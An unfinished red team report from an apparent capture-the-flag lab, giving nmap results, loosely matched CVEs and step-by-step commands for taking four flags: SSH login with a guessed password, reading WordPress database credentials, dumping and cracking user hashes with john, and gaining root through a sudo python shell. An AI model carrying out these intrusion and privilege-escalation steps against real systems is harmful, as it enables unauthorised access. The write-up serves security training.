# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap 192.168.1.0/24
# Insert nmap Screenshot
```

This scan identifies the services below as potential points of entry:
- Target 1
  - Port 22/tcp open ssh (service) OpenSSH 6.7p1 Debian 5+deb8u4
  - Port 80/tcp open http (service) Apache httpd 2.4.10 ((Debian))
  - Port 111/tcp open rpcbind (service) 2-4 (RPC #100000)
  - Port 139/tcp open netbios-ssn (services) Samba smbd 3.X - 4.X
  - Port 445/tcp open netbios-ssn (services) Samba smbd 3.X - 4.X

_TODO: Fill out the list below. Include severity, and CVE numbers, if possible._

The following vulnerabilities were identified on Target 1:
- Target 1
  - CVE-2021-28041 open SSH (Severity: High)
  - CVE-2017-15710 Apache https 2.4.10 (Severity: High)
  - CVE-2017-8779 exploit on open rpcbind port could lead to remote DoS (Severity: High)
  - CVE-2017-7494 Samba NetBIOS (Severity: Critical)


_TODO: ADD Screenshot nmap -sV 


### Exploitation
_TODO: Fill out the details below. Include screenshots where possible._

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: _TODO: Insert `flag1.txt` hash value_
    - **Exploit Used**
      - ssh into Michael's account and look through files in /var/www
      - Command: ssh michael@192.168.1.110
      - The username and password for Michael's account is identical: michael
      - Command: cd /var/www
      - Command: ls 
      - Command: grep -RE flag html
      ### ADD Screenshot of Flag 1

  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
    - **Exploit Used**
      - Command: ssh michael@192.168.1.110 
      - The username and password for Michael's account is identical: michael
      - Command: locate *flag*
      - Command: cat /var/www/flag2.txt
       ### ADD Screenshot of locate *flag* and flag2.txt.png

  - `flag3.txt`: 
    - **Exploit Used**
      - Continued using michael shell to find the MySQL database password, logged into MySQL database, and found Flag 3 in wp_posts table.
      - Command: ls /var/www/html/wordpress/
	### Add ls wordpress/Screenshot
      - Command: cat /var/www/html/wordpress/wp-config.php
	### ADD DB Username & Password Screenshot

    - Used the credentials to log into MySQL and dump WordPress user password hashes.
      - DB_NAME: wordpress
      - DB_USER: root
      - DB_PASSWORD: R@v3nSecurity
      - Command: mysql -u root -p
       ## ADD mysql screenshot 

    - Search MySQL database for Flag 3 and Wordpress user password hashes:
      - Flag 3 found in wp_posts.
      - Password hashes found in wp_users.
      - Command: show databases;
      ### ADD show database Screenshot
      - Command: use wordpress;
      ### ADD use wordpress Screenshot
      - Command: show tables;
       ### ADD show tables Screenshot
      - Command: SELECT * FROM wp_posts;	
      ### SCREENSHOT  SELECT * FROM wp_posts;

    - Screenshot of Wordpress user password hashes:
      - Command: select * from wp_users;
    ### ADD Steven hashed password Screenshot

   - Screenshot of Flag 3
     - Command: select * from wp_posts;
   #### ADD Screenshot of select * from wp_posts;


  - `flag4.txt`:
    - **Exploit Used**
      - Used john to crack the password hash obtained from MySQL database, secured a new user shell as Steven, escalated to root.
      - Cracking the hashed password using john.
      - Copied password hash from MySQL into ~/root/wp_hashes.txt and cracked with john to discover Steven’s password: pink84.
      - Command: john wp_hashes.txt
	### ADD Screenshot Steven's Password Cracked hashed

    - Secure a user shell as the user whose password you cracked.
      - Command: ssh steven@192.168.1.110
      - Password: pink84
    - Escalating to root:
      - Command: sudo -l  
    ### ADD SCREENSHOT sudo -l
      - Command: sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
     ### ADD Screenshot for python command

    - Search for the root directory for Flag 4.
      - Command: cd /root/
      - Command: ls
      - Command: cat flag4.txt
    ### ADD SCREENSHOT cd root, ls, cat flag4.txt
